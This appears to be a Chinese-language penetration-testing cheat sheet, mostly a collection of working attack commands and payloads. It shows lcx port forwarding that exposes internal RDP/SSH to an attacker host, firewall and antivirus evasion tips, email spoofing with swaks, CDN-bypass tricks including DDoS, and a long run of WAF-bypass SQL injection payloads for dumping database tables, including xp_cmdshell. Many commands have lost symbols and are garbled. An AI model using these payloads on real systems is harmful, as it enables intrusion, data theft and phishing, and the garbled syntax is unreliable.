-h ## 在线帮助。 -i延迟秒数 ## 设置时间间隔，以便传送信息及扫描通信端口。 -l 使用监听模式，## 管控传入的资料。 -n ## 直接使用IP地址，而不通过域名服务器。 -o输出文件 ## 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。 -p通信端口 ## 设置本地主机使用的通信端口。 -r ## 乱数指定本地与远端主机的通信端口。 -s来源位址 ## 设置本地主机送出数据包的IP地址。 -u ## 使用UDP传输协议。 -v ## 显示指令执行过程。 -w超时秒数 ## 设置等待连线的时间。 -z ##使用0输入输出模式，只在扫描通信端口时使用。 1-2-15 lcx端口转发## LCX端口转发是一种强大的网络工具，它可以将本地端口与远程端口进行连接，实现跨网络的数据传输。使用LCX端口转发，我们可以轻松地在不同的网络之间建立安全、稳定的连接，方便地进行远程访问、数据传输和网络测试等操作。 1. 参数介绍： -listen：指定本地监听端口，即要进行转发的本地端口。 -forward：指定要转发到的远程主机和端口。 -fwdType：指定转发类型，支持TCP、UDP和HTTP。 -bindTo：指定要绑定的本地地址，可以是本机IP地址或特定的网络接口。 -xorKey：指定要使用的XOR加密密钥，用于保护转发的数据。 -verbose：显示更详细的运行日志信息。 -compress：启用数据压缩功能，提高数据传输效率。 -kill：关闭所有活动转发并退出程序。 2，简单使用 a. 端口转发: lcx -listen 本地端口 -forward 远程主机:远程端口n 例如: lcx -listen 8888 -forward 192.168.1.100:8888n ## 这条命令将本地的8888端口转发到远程主机192.168.1.100的8888端口。 b. 指定绑定地址: lcx -listen 本地地址:本地端口 -forward 远程主机:远程端口 -bindTo 绑定地址n 例如: lcx -listen 192.168.0.10:8888 -forward 192.168.1.100:8888 -bindTo 192.168.0.10n ## 这条命令将本地地址为192.168.0.10的8888端口转发到远程主机192.168.1.100的8888端口，并绑定到本地地址192.168.0.10。 ## lcx.exe是一个端口转发工具，有Windows版和Linux版两个版本，Windows版是lcx.exe,Linux版为portmap Windows版使用方法如下： lcx有两大功能： 1）端口转发(listen和slave成对使用) 2）端口映射(tran) 端口转发： Lcx -listen 监听slave请求的端口等待连接的端口 Lcx -slave 攻击机IP监听端口目标IP目标端口 端口映射： Lcx -tran等待连接的端口目标IP日标端口 1、lcx 内网端口转发 ## 内网主机上执行：lcx.exe –slave 公网主机ip 公网主机端口 内网主机ip 内网主机端口 lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389 ## 意思是把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口 ## 公网主机 上执行 Lcx.exe –listen 公网主机端口1 公网主机端口2 lcx.exe –listen 4444 5555 ## 意思是监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口。 ## 此时，RDP 连接，Windows 命令行下输入mstsc，即可打开远程桌面连接: 2、本地端口转发 ## 由于防火墙限制，部分端口如3389无法通过防火墙，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口，如53端口， ## 目标主机上执行： lcx -tran 53 目标主机ip 3389 ## 这时我们可以直接远程桌面连接到到 目标主机IP:53 ## 注：软件可能会被杀软查杀，可自行寻找免杀版本。 Linux版使用方法： ## 先在具有公网ip的主机上执行： .portmap -m 2 -p1 6666 -h2 公网主机ip -p2 7777 ## 意思是监听来自6666端口的请求，将其转发到7777端口 ## 再在内网主机上执行： .portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网主机ip -p2 6666 ## 意思就是将内网主机22端口的流量转发到公网主机的6666端口。 ## 然后在Linux系统命令行下执行 ssh 公网主机ip 7777 ##即可连接内网主机。 1-2-16 安装Nginx## 比如centos7的，使用epel源安装 yum install epel-release -y yum install nginx -y systemctl start nginx.service systemctl enable nginx.service 二，Windows1-1 常用指令1-1-1 telnet## 检测端口开放 telnet 101.132.222.28 3306 ## 查看某个端口是否开放 1-1-2 tracert## 路由跳转记录 tracert 101.132.222.28 ## 路由跳转记录 1-1-3 系统服务msconfig、services.msc、sc 、tasklist svc ## 注:svc是详细查看一个宿主进程对应的多项服务 。 ## SC是Service Control Manager的缩写，是Windows操作系统中的一个命令行工具，用于管理服务。它可以启动、停止、暂停、恢复和删除服务，还可以查询服务的详细信息。SC命令的参数包括： - server：## 指定服务所在的远程服务器的名称。该名称必须使用通用命名约定 (UNC) 格式（例如 \\myserver）。 - servicename：## 指定 getkeyname 操作返回的服务名称。 - command：## 指定要执行的命令。 - start：## 启动服务。 - stop：## 停止服务。 - pause：##暂停服务。 - resume：## 恢复服务。 - remove：## 删除服务。 1-1-4 taskkilltaskkill f PID 进程号 ## 其中 f 表示强杀、强制结束 S system ## 指定要连接的远程系统。 U [domain]user ## 指定应该在哪个用户上下文执行这个命令。 P [password] ## 为提供的用户上下文指定密码。如果忽略，提示输入。 FI filter ## 应用筛选器以选择一组任务。允许使用 ““。例如，映像名称 eq acme PID processid ## 指定要终止的进程的 PID。使用 TaskList 取得 PID。 IM imagename ## 指定要终止的进程的映像名称。通配符 ‘‘可用来指定所有任务或映像名称。 T ## 终止指定的进程和由它启用的子进程。 F ## 指定强制终止进程。 ? ## 显示帮助消息。 2 筛选器: 筛选器名 有效运算符 有效值 ———– ————— ————————- STATUS eq, ne RUNNING |NOT RESPONDING | UNKNOWN IMAGENAME eq, ne 映像名称 PID eq, ne, gt, lt, ge, le PID 值 SESSION eq, ne, gt, lt, ge, le 会话编号。 CPUTIME eq, ne, gt, lt, ge, le CPU 时间，格式为 hh:mm:ss。 hh - 时， mm - 分，ss - 秒 MEMUSAGE eq, ne, gt, lt, ge, le 内存使用量，单位为 KB USERNAME eq, ne 用户名，格式为 [domain]user MODULES eq, ne DLL 名称 SERVICES eq, ne 服务名称 WINDOWTITLE eq, ne 窗口标题 说明 —- 1) 只有在应用筛选器的情况下，IM 切换才能使用通配符 ‘‘。 2) 远程进程总是要强行 (F) 终止。 3) 当指定远程机器时，不支持 “WINDOWTITLE” 和 “STATUS” 筛选器。 3、例如 TASKKILL IM notepad.exe TASKKILL PID 1230 PID 1241 PID 1253 T TASKKILL F IM cmd.exe T TASKKILL F FI “PID ge 1000” FI “WINDOWTITLE ne untitle*” TASKKILL F FI “USERNAME eq NT AUTHORITY\\SYSTEM” IM notepad.exe TASKKILL S system U domain\\username FI “USERNAME ne NT*” IM * TASKKILL S system U username P password FI “IMAGENAME eq note*” eventvwr.msc ## ————— 事件查看器 1-1-5 del del ah f DLLHOST.exe ————– ## 其中 ah 是只删除所有隐藏文件的意思 p ## 提示您确认是否删除指定的文件。 f ## 强制删除只读文件。 s ## 从当前目录及其所有子目录中删除指定文件。显示正在被删除的文件名。 q ## 指定安静模式。不对删除确认作出提示。 a ## 根据指定的属性删除文件。 1-1-6 dirdir s rundll32.exe p\t## 一次显示一屏列表。要查看下一个屏幕，请按任意键。 q\t## 显示文件所有权信息 w\t## 以宽格式显示列表，每行最多包含五个文件名或目录名 d\t## 以与 w 相同的格式显示列表，但文件按列排序。 a\t## 仅显示具有您指定属性的目录和文件的名称。 t ## 指定要显示或用于排序的时间字段。可用的时间字段值为：c - Creationa - 最后访问w - 最后写入 s\t## 列出指定目录和所有子目录中指定文件名的每次出现。 b\t## 显示目录和文件的裸列表，没有其他信息。 b 参数覆盖 w。 l\t## 使用小写显示未排序的目录名和文件名。 n\t## 在屏幕的最右侧显示带有文件名的长列表格式。 x\t## 显示为非 8dot3 文件名生成的短名称。显示与 n 的显示相同，但在长名称之前插入短名称。 c\t## 以文件大小显示千位分隔符。这是默认行为。使用 -c 隐藏分隔符。 4\t## 以四位数格式显示年份。 r\t## 显示文件的备用数据流。 ?\t## 在命令提示符处显示帮助。 1-1-7 attrrib## attrib是dos和Windows系统中的一个用于更改文件或目录属性的命令，它的语法格式如下： attrib [+r | -r] [+a | -a] [+s | -s] [+h | -h] [驱动器:][路径]文件名 [s [d]] attrib 命令有4个常用参数： r ## 读 a ## 存档 s ## 系统 h ## 隐藏分别为、、、等属性。这些参数用来更改文件或目录的属性，其中加号（+）代表添加属性，减号（-）代表取消属性。 ## 例如，+r 表示将文件设置为“只读”， -r 表示将其取消“只读”属性； ## +h 表示将文件的隐藏属性设置为“是”，-h 则表示取消这个属性。 ## attrib 命令除了可以更改文件的属性，还可以使用 d 和 s 参数循环遍历目录中的文件和文件夹。其中，d 参数用于更改目录的属性， s参数用于同时更改当前目录下所有子目录中的文件和文件夹的属性。 ## 实例1：将文件设置为“只读” attrib +r c:\\test.txt 如果想要取消某个文件的只读属性 attrib -r c:\\test.txt ## 实例2：将目录以及目录下的文件和文件夹设置为隐藏 首先，先用命令行生成一个mydoc文件夹 if not exist c:\\mydoc md c:\\mydoc ## 然后再创建3个文件夹 for l %i in (1 1 3) do md c:\\mydoc%i ## 在命令提示符下输入如下命令： attrib +h s d c:\\mydoc ## 如果想要取消某个目录及其子目录下的所有隐藏属性，输入如下命令即可： attrib -h s d c:\\mydoc 1-1-8 指定我们自己的终端 setp c:\\www\\1111\\cmd.exe 1-1-9 net user## 1、增加用户 net user username password add ## 2、删除用户 net user username del ## 3、修改用户密码 net user username newpassword ## 4、升级用户为管理员 net localgroup administrators username add ## 5、将管理员账户降为普通用户 net localgroup administrators username del ## 6、查看所有用户 net user ## 7、查看特定用户信息 net user username ## 8、激活特定用户 net user username active:yes ## 9、禁用特定用户 net user username active:no ## 10、查看特定用户组所包含的用户 net localgroup groupname 1-1-10 快速查找未打补丁的EXP## 快速查找未打补丁的 exp，可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下： systeminfomicropoor.txt(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find i “%i”|| @echo %i you can fuck)del f q a micropoor.txt 1-1-11 scSC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。 创建 # 安装服务 ## 服务名称是redis， C:\\Windows\\system32sc create redis binpath “D:\\work\\databases\\Redis-x64-3.2.100\\redis-server.exe –service-run D:\\work\\databases\\Redis-x64-3.2.100\\redis.windows.conf” ## 直接创建时也能设置显示名称 C:\\Windows\\system32sc create redis binPathD:\\work\\databases\\Redis-x64-3.2.100\\redis-server.exe DisplayName redis 查询 # 使用query参数 C:\\Windows\\system32sc query redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 # 使用queryex参数（比query查询多出两个结果） C:\\Windows\\system32sc queryex redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PID : 0 FLAGS : 启动 # 先查询服务状态(STOPPED) C:\\Windows\\system32sc query redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 1 STOPPED WIN32_EXIT_CODE : 1077 (0x435) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 # 启动服务(RUNNING) C:\\Windows\\system32sc start redis SERVICE_NAME: redis TYPE : 10 WIN32_OWN_PROCESS STATE : 4 RUNNING (STOPPABLE, NOT_PAUSABLE, ACCEPTS_PRESHUTDOWN) WIN32_EXIT_CODE : 0 (0x0) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0 PID : 8896 FLAGS : 停止 # 直接停止 sc stop redis # 添加停止原因和备注 sc stop redis 1:2:8 “must stop redis” 配置 # 配置服务的显示名称，这里将服务的显示名字redis改成REDIS显示（displayname不区分大小写，且等号后有空格） C:\\Windows\\system32sc config redis displayname REDIS [SC] ChangeServiceConfig 成功 # 配置服务描述 C:\\Windows\\system32sc description redis “redis的描述内容” [SC] ChangeServiceConfig2 成功 删除 #删除服务 C:\\Windows\\system32sc delete redis [SC] DeleteService 成功 # 删除后再查看 C:\\Windows\\system32sc query redis [SC] EnumQueryServicesStatus:OpenService 失败 1060: 指定的服务未安装。 实例 手动启动 sc Create 手动 binPath “cmd K start” type own type interact sc start 手动 sc Create 手动启动 binPath “cmd K start” type own type interact start DEMAND sc start 手动启动 测试 sc Create aini binPath “cmd K start” type own type interact start AUTO sc start aini 1-1-12 netsha) 启用防火墙 C:netsh firewall set opmode mode enable b) 关闭防火墙 C:netsh firewall set opmode mode disable c) 重置防火墙 C:netsh firewall reset 1、查看网络配置 netsh interface ip show {选项} {选项}可以是： address - ## 显示 IP 地址配置。 config - ## 显示 IP 地址和更多信息。 dns - ## 显示 DNS 服务器地址。 icmp - ### 显示 ICMP 统计。 interface - ## 显示 IP 接口统计。 ipaddress - ## 显示当前 IP 地址 ipnet - ## 显示 IP 的网络到媒体的映射。 ipstats - ## 显示 IP 统计。 joins - ## 显示加入的多播组。 offload - ## 显示卸载信息。 tcpconn - ##显示 TCP 连接。 tcpstats - ## 显示 TCP 统计。 udpconn - ## 显示 UDP 连接。 udpstats - ## 显示 UDP 统计。 wins - ## 显示 WINS 服务器地址。 2、配置接口IP网关IP netsh interface ip set address “本地连接” static 192.168.1.100 255.255.255.0 192.168.1.253 —————————— C:netsh interface ip show config 接口 “本地连接” 的配置 DHCP 启用 否 IP 地址 192.168.1.100 子网掩码 255.255.255.0 默认网关: 192.168.1.253 GatewayMetric: 0 InterfaceMetric 0 静态配置的 DNS 服务器: 202.96.209.134 静态配置的 WINS 服务器: 无 用哪个前缀注册: 只是主要 3、配置自动换取IP地址,DNS地址及wins地址 netsh interface ip set address “本地连接” dhcp netsh interface ip set dns “本地连接” dhcp netsh interface ip set wins “本地连接” dhcp 4、配置静态IP地址，DNS地址及wins地址 netsh interface ip set address “本地连接” static 192.168.1.253 netsh interface ip set dns “本地连接” static 202.96.209.6 netsh interface ip set wins “本地连接” static 192.168.1.1 5、查看并导出网络配置文件 C:netsh -c interface dump c:\\dump.txt （””表示导出。””表示追加） # # 接口配置 # pushd interface reset all popd # 接口配置结束 # # 接口配置 # pushd interface ipv6 uninstall popd # 接口配置结束 # ———————————- # ISATAP 配置 # ———————————- pushd interface ipv6 isatap popd # ISATAP 配置结束 # ———————————- # 6to4 配置 # ———————————- pushd interface ipv6 6to4 reset popd # 6to4 配置结束 # # 端口代理配置 # pushd interface portproxy reset popd # 端口代理配置结束 # ———————————- # 接口 IP 配置 # ———————————- pushd interface ip # “本地连接” 的接口 IP 配置 set address name”本地连接” sourcestatic addr192.168.1.5 mask255.255.255.0 set address name”本地连接” gateway192.168.1.1 gwmetric0 set dns name”本地连接” sourcestatic addr202.96.209.134 registerPRIMARY set wins name”本地连接” sourcestatic addrnone popd # 接口 IP 配置结束 6、导入网络配置文件 C:netsh -f c:\\dump.txt C:netsh exec c:\\dump.txt 三，知识点3-1 如何检测CDN## 1，nslookup 进行检测 ## 2，多ping 检测 http://ping.chinaz.com/ http://ping.aizhan.com/ http://ce.cloud.360.cn/ 3-2 绕过方法 — 找真实IP## ping 一个不存在的二级域名 ## 查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录 https://dnsdb.io/zh-cn/ ###DNS查询 https://x.threatbook.cn/ ###微步在线 http://toolbar.netcraft.com/site_report?url=www.bigcoders.cn ###在线域名信息查询 http://viewdns.info/ ###DNS、IP等查询 https://tools.ipip.net/cdn.php ###CDN查询IP https://securitytrails.com/domain/bigcoders.cn/dns ## 观看ip变化 http://toolbar.netcraft.com/site_report?url=www.sina.com ## 查询子域名 ## 主要的意思是一个公司可能有上百个网站，不一定每个网站都使用了cdn。 （1）微步在线(https://x.threatbook.cn/) （2）Dnsdb查询法(https://dnsdb.io/zh-cn/) （3）Google 搜索Google site:baidu.com -www就能查看除www外的子域名 （4）各种子域名扫描器 （5）网络空间引擎搜索法 常见的有以前的钟馗之眼，shodan，fofa搜索。 ## 利用SSL证书寻找真实原始IP ## 网站漏洞查找 1）目标敏感文件泄露，例如：phpinfo之类的探针、”info.php”, “phpinfo.php”, “test.php”, “l.php”、GitHub信息泄露等。 2）查看漏洞扫描报警信息，手工造成页面报错 3）XSS盲打，命令执行反弹shell，SSRF等。 4）无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP，这个太难了，如果要做的 话，一般是钓鱼的方式，比如发邮件之类的。 5）直接ping一个asdfasdf.baidu.com，如果开启了泛域名解析，那么ping到的一般是真实ip地址。 ## 网站邮件订阅查找 RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。 ## 通过国外服务器ping对方网站 ## 用 Zmap 扫全网 就是扫描整个网段，比如就扫描80、443端口，每个网站不是都有标题标签码，以关键字的方式来匹配提取，不过这个方法太麻烦了。 ## DDOS把 CDN 流量打光 3-3 什么是越权，越权漏洞原理## 越权 ## 所谓越权，就是绕过权限限制或者在权限限制不够严格的情况下去访问原来不应该访问到的资源。比如：目录越权、任意订单遍历的业务类越权等等，其中，目录越权分为多种，常见的有：目录权限设置不严格、权限没有递归设置、web站点越权访问、用户权限鉴权被绕过。 ## 原理 ## 如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。越权漏洞形成的原因是后台使用了不合理的权限校验规则导致的。 3-4 什么是APT攻击## 有组织、有特定目标、持续时间极长的新型攻击和威胁，国际上有的称之为 APT（Advanced Persistent Threat）攻击 ## 高级持续性威胁(Advanced Persistent Threat)是指组织(特别是政府)或者小团体使用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式 3-5 WEB应用其它常见漏洞总结1. 暴力猜解用户名及密码 2. 扫敏感目录及备份文件 3. PhpMyadmin的万能密码 4. 报错页面的图片也是可以存在反射型XSS的 5. 隐藏域中可能存着明文密码 6. 逻辑漏洞——任意用户密码重置 7. 短信炸弹 8. SVN源码泄露 9. 扫描一下局域网共享 10. 关注一些非主流的漏洞，如HTTP响应拆分漏洞 11. 扫一下端口 nmap扫端口，开放着9091、21端口，浏览器打开发现9091是另一个WEB应用 12. 发掘隐藏的链接地址 13. 发掘一些越权的测试页面 14. IIS短文件名泄露漏洞 这个漏洞只有微软的操作系统才有，2008、2012等都有。 ## 危害：Microsoft IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“” 字符\t猜解或遍历服务器中的文件名，或对IIS服务器中的.Net Framework进行拒绝服务攻击。 ## 验证方法说明：在命令行模式运行IIS-shortname工具，执行java scanner 2 20 http://www.xxx.com回车执行，看是否能遍历服 务器中的文件名。显示出来的不是文件的全名，只显示一部分，所以叫做短文件名漏洞，因为后面可以进行猜测。这个漏洞修复需要 修改注册表，具体怎么操作，大家去网上搜一下短文件名漏洞修复就能找到。 15. jQuery存在XSS漏洞 ## 版本低于1.7的jQuery过滤用户输入数据所使用的正则表达式存在缺陷，可能导致LOCATION.HASH跨站漏洞。 ## 验证方法说明：直接在火狐浏览器打开JQuery漏洞地址，查看源代码里面的JQuery版本是否存在低于1.7，如果低于1.7那么就存在漏 洞。 16. 目录浏览漏洞 ## 危害：由于Web服务器权限配置不当，造成用户可以直接浏览Web网站目录，如图片目录images,javascript目录js, 不同的目录潜在 的危险\t是不同的。攻击者一般利用常见目录中可能包含的敏感文件获取敏感信息。 ## 验证方法说明：直接在火狐浏览器打开目录浏览页面，看是否存在列目录。 17. URL跳转漏洞 18. 框架钓鱼漏洞 19. 点击劫持 ## 应用程序没有对用户提交的数据进行有效的过滤或转换，攻击者可向WEB页面里插入对终端用户造成影响或损失的恶意链接。 20. HTTP报头追踪漏洞 21. DNS域传送漏洞 22. 私有IP泄露 23. 网站物理路径信息泄漏漏洞 ## 报错信息中提示了网站物理路径，也是漏洞。算中危漏洞。其实中危和低危漏洞都是辅助型漏洞，不能直接拿到服务器权限，和其他高 危漏洞配合的。 24. 系统重装漏洞 ## 易商宝”CMS存在系统重装漏洞，通过此漏洞可重新安装该CMS，并取得网站的管理员权限。为不影响网站的正常运行，未进行漏洞 实际验证。所以一定要注意这种类型的初始化页面，不要让别人访问，严格控制。 25. 任意文件下载 26.不安全的请求方法 https://zhuanlan.zhihu.com/p/96482835 https://blog.csdn.net/dltsbydh/article/details/96323697 3-6 常见逻辑漏洞案例1、任意修改用户资料 2、任意查询用户信息 3、任意重置用户密码 4、恶意注册 5、恶意短信 6、其它逻辑漏洞 3-7 常见钓鱼方式## exe程序挂马 ## 快捷方式挂马 ## 扩展名伪造 ## office文件挂马 3-8 邮件钓鱼## SPF ———- 一种以IP地址认证电子邮件发件人身份的技术 ## DKIM ———– DKIM让企业可以把加密签名插入到发送的电子邮件中，然后把该签名与域名关联起来 ## DMARC ———– 是txt记录中的一种，是一种基于现有的SPF和DKIM协议的可扩展电子邮件认证协议，其核心思想是邮件的发送方通过特定方式（DNS）公开表明自己会用到的发件服务器（SPF）、并对发出的邮件内容进行签名(DKIM)，而邮件的接收方则检查收到的邮件是否来自发送方授权过的服务器并核对签名是否有效 3-8-1 要想查看一个域名是否配置了SPF安全策略nslookup -typetxt .com.cn #查看dns中txt类型的记录 dig -t txt 163.com 未配置的是这样： 配置了spf协议的看到的信息如下 但凡是开启了spf安全认证的邮件服务器，是不允许发送匿名邮件的，什么叫做匿名邮件呢？ 3-8-2 伪造邮件## 最简单的办法就是使用swaks之类的邮件伪造工具,kali中自带 swaks –to xxxx@qq.com –from info@XXX.com –ehlo XXX.com –body hello –header “Subject: hello” –to 收件人邮箱 –from 要显示的发件人邮箱 –ehlo 伪造的邮件ehlo头 –body 邮件正文 –header 邮件头信息，subject为邮件标题 配置了SPF的情况 这种情况就需要用一些权威的邮件服务商去发送邮件了 如sendgrid，mailgun，这些权威邮件服务商，会被大部分邮件服务商加到白名单中，这样他们的邮件就不会进到垃圾箱。也就是各大权威邮件服务商都是互相有个白名单处理的，通过他们可以伪造发送匿名邮件，有时候是能够成功的。 3-9 web漏洞 3-10 系统漏洞方法： 1.漏扫，awvs，IBM appscan等。最快的方法就是通过工具来探测，一般大一点的工具都是收费的，不过有破解的，像系统漏洞，工具中集成了几万个漏洞，扫起来很快、并且直接可以成图成报告 2.结合漏洞去百度、seebug、exploit-db(漏洞库，里面含有好多之前出现过的漏洞)等位置找利用，回头会给大家讲漏洞库的使用。 3.在网上寻找验证poc(poc：漏洞利用工具和代码脚本等等，直接进行攻击)。 内容： 系统漏洞：## 系统没有及时打补丁 Websever漏洞：## Websever配置问题 Web应用漏洞：## Web应用开发问题 其它端口服务漏洞：## 各种218080(st2)7001223389，前面我们通过nmap扫描过了 通信安全：## 明文传输，token在cookie中传送等。 3-11 waf 有哪些功能## 网马木马主动防御及查杀 ### 流量监控 # 网站漏洞防御功能 ## 危险组件防护功能 ## .Net安全保护模块 ## 双层防盗链链接模式 ## 网站特定资源防下载 ## CC攻击防护 ## 网站流量保护 ## IP黑白名单 3-12 waf注入绕过检测方法 3-12-1 WAF身份认证阶段的绕过## 伪造搜索引擎 ——————— 这种方式现在已经不行了昂，所以看看即可 老版本的WAF是有这个漏洞的，就是把User-Agent修改为搜索引擎，便可以绕过，进行sql注入等攻击,这里推荐一个火狐插件，我给大家的那个火狐浏览器就有昂，可以修改User-Agent，叫User-Agent Switcher 下载地址: https://addons.mozilla.org/zh-CN/firefox/addon/user-agent-switcher/安装完后重启Firefox浏览器, 打开User Agent Switcher设置面板 当然喜欢用burp的朋友也可以通burp来修改User-Agent 如果想批量替换User_Agent，也是可以的 ## 伪造白名单特殊目录 ——————– 属于waf管理员配置规则不当导致的。 360webscan脚本存在这个问题，就是判断是否为admin dede install等目录，如果是则不做拦截，也就 是白名单设置的有问题，发现是 admin 开头的路径请求就直接放行了。 ## 直接攻击源站(真实ip地址) 这个方法可以用于安全宝、加速乐等云WAF，云WAF的原理通过DNS解析到云WAF，访问网站的流量要,经过指定的DNS服务器解析，然后进入WAF节点进行过滤，最后访问原始服务器，如果我们能通过一些手段（比如c段、社工）找到原始的服务器地址，便可以绕过，这个我也没有找到太好的例子，就不多做说明了。 3-12-2 WAF数据包解析阶段的绕过2-1 编码绕过## 最常见的方法之一，可以进行urlencode，这是早期的方法，现在效果不是太好 2-2 修改请求方式和请求数据位置绕过我想玩渗透的都知道cookie中转注入，最典型的修改请求方式绕过，很多的asp，aspx网站都存在这个问题，有时候WAF对GET进行了过滤，但是Cookie甚至POST参数却没有检测。 2-3 复参数绕过## 复参数绕过 #3 例如一个请求是这样的 GET pennews.php?id1 union select user,password from mysql.user ## 可以修改为 GET pennews.php?id1idunionidselectiduser,passwordidfrom%20mysql.user ## 很多WAF都可以这样绕，测试最新版WAF能绕过部分语句。 3-12-3 WAF触发规则的绕过3-1 特殊字符替换空格## 用一些特殊字符代替空格，比如在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的WAF，在sqlserver和mysql中都可以用代替空格，也可以使用如下方法： http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/union/*|%23--%23|*/select/*|%23--%23|*/1,user(),3,4,5 http://192.168.0.142:8080/sql.php?id=1/*|%23--%23|*/and/*|%23--%23|*/1=2 %23 是#的url编码形式 3-2 特殊字符拼接## 把特殊字符拼接起来绕过WAF的检测，通过+拼接，比如在Mysql中，可以利用注释来绕过，在mssql中，函数里面可以用+来拼接 如： GET pennews.php?id1;exec(master..xp_cmdshell ‘net user’) 可以改为： GET pennews.php?id1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘) 3-3 注释包含关键字## 在mysql中，可以利用!包含关键词进行绕过，在mysql中这个不是注释，而是取消注释的内容。测试最新版本的WAF可以完美绕过。 如: GET pennews.php?id1 union select user,password from mysql.user 可以改为: GET pennews.php?id1 !union* *!select user,password !frommysql.user 3-4 空格替换法## 把空格替换成%0a可以绕过最新版本WAF, 在Pangolin中 点击 编辑– 配置– 高级– 选择替换空格使用– 填上%0a即可 http://192.168.0.142:8080/sql.php?id=1%20union%23%0aselect%23%0a1,user(),3,4,5 3-5 使用大小写http://www.***.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4…. 3-6 双写（不好用）http://www.***.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4…. ## 此方法适用于一些会把union select替换掉的WAF，经过WAF过滤后就会变成 union select 1,2,3,4…. 3-7 编码与注释结合## 经测试部分语句可以过最新的waf http://www.***.com/index.php?page_id=-15 %55nION%53ElecT 1,2,3,4… http://192.168.0.142:8080/sql.php?id=1/!50000*union*!50000select!500001,user(),3,4,5 ## 也可以这样 http://192.11.22.55/sqli/Less-1/?id=1‘ and !11 %23 (WAF不拦截) U替换为%55，S替换为%53 在 union 和 select 之间添加注释 手工进行加注释进行注入太慢，一般我们通过Sqlmap这类工具来实现自动注入: sqlmap.py -u “URL” –tamper”versionedmorekeywords.py” –dealy1 3-8 利用WAF本身的功能绕过(不好用)## 假如你发现WAF会把”“替换为空，那么你就可以利用这一特性来进行绕过 http://www.site.com/index.php?page_id=-15+uni*on+sel*ect+1,2,3,4…. ## 其它方法-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select 1,2,3,4…) 3-9 使用其他变量或者命令对注入语句进行替换(√)COMMAND | WHAT TO USE INSTEAD @@version | version() concat() | concat_ws() group_concat() | concat_ws() | like 上面这个方法就是将11改写为了 87 取余，然后in是查看是否在列表中，效果和11是一样的，但是能过waf。 3-10 组合绕过wafhttp://192.168.222.128/test/sql.php?id=1 !union*%!aa!select 1,2,3 ## 先判断注入点，把and为，urlencode后为%26%26 http://192.168.0.102:8080/sql.php?id=1%20%26%26%20-1=-2 下面我们具体讲解绕过方法： 1.利用()代替空格 2.利用mysql特性 ! 执行语句 3.利用注释符号混淆代码 我给出的注入语句是： union%00**!50010select(database()),(user())%23id1|%23–%23|unioN|%23–%23|sElect|%23–%23|1,user(),(database()),4,5 http://192.168.0.102:8080/sql.php?id=1 union%00**!50010select1,user(),version(),4,5 这里要注意的几点是 1.mysql关键字中是不能插入的，即select是会报错的，但是函数名和括号之间是可以加上的,像database()这样的代码是可以执行的 2.!中间的代码是可以执行的，其中50010为mysql版本号，只要mysql大于这个版本就会执行里面的代码 3.数据或者函数周围可以无限嵌套() 4.利用好%00 user()) 3-11 完整过狗注入语句## 判断： 1’%26%261%3d2%23 ## 判断列数： 1’ order by 2%23 ## 关联查询爆出用户和数据库： 1%27%20union%00**!50010select(database()),(user())%23 ## 关联查询爆出数据表： %27%20union%00!50010select((group_concat(table_name))),nullfrom((information_schema.TABLES))whereTABLE_SCHEMA%3d(database())%23 ## 关联查询爆出字段值： %27%20union%00**!50010select((group_concat(COLUMN_NAME))),nullfrom((information_schema.columns))whereTABLE_NAME%3d%27users%27%23 ## 关联查询提取数据： %27%20union%00!50010select((group_concat(first_name))),nullfrom((users))%23 ## 盲注爆出数据库： 1’ and substr(database(),1,1)%3d’1’%23 ## 盲注爆出数据表： 1’%00*and substr((*!50010select((group_concat(table_name)))from((information_schema.TABLES))whereTABLE_SCHEMA%3d(database())),1,1)%3d’1’%23 ## 盲注爆出字段值： 1’%00*and substr((*!50010select((group_concat(COLUMN_NAME)))from((information_schema.columns))whereTABLE_NAME%3d%27users%27),1,1)%3d’1’%23 ## 盲注提取数据： 1’%00and substr((!50010select((group_concat(first_name)))from((users))),1,1)%3d’1’%23\\ ## 基于时间的盲注爆出数据库： 1’%00and (select case when (substr(database(),1,1) like ‘d’) then sleep(3) else 0 end)%23 ## 基于时间的盲注爆出数据表： 1’%00and (select case when (substr((!50010select((group_concat(table_name)))from((information_s chema.TABLES))whereTABLE_SCHEMA%3d(database())),1,1) like ‘d’) then sleep(3) else 0 end)%23 ## 